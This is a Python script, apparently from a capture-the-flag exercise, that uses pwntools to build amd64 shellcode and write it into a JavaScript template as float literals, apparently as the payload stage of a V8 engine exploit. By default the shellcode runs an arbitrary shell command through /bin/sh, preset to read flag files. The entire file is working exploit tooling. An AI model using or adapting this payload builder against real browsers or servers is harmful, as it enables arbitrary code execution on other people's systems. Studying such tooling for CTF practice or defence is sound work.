#!/usr/bin/env python3
"""Substitute __SC__ placeholder in a JS template with shellcode float literals.
usage: _z_v8_build.py template.js out.js [cmd] [mode]
"""
import sys, subprocess, struct
from pwn import asm, shellcraft, context

context.clear(arch='amd64', os='linux')

tpl_path, out_path = sys.argv[1], sys.argv[2]
cmd = sys.argv[3] if len(sys.argv) > 3 else "cat flag.txt /flag.txt /flag 2>/dev/null; ls -la"
mode = sys.argv[4] if len(sys.argv) > 4 else 'sh'

if mode == 'cat':
    sc = asm(shellcraft.cat('flag.txt'))
else:
    sc  = asm(shellcraft.pushstr(cmd, append_null=True))
    sc += asm("mov rbx, rsp")
    sc += asm(shellcraft.pushstr("-c", append_null=True))
    sc += asm("mov rcx, rsp")
    sc += asm(shellcraft.pushstr("/bin/sh"))
    sc += asm("mov rdi, rsp")
    sc += asm("""
        xor edx, edx
        push rdx
        push rbx
        push rcx
        push rdi
        mov rsi, rsp
        xor edx, edx
        mov eax, 59
        syscall
        mov eax, 60
        xor edi, edi
        syscall
    """)

while len(sc) % 8 != 0:
    sc += b"\x90"

vals = [repr(struct.unpack("<d", sc[i:i+8])[0]) for i in range(0, len(sc), 8)]
js = ", ".join(vals)

tpl = open(tpl_path).read()
out = tpl.replace("__SC__", js)
open(out_path, "w").write(out)
sys.stderr.write("shellcode %d bytes / %d doubles -> %s (%d bytes)\n" % (len(sc), len(vals), out_path, len(out)))
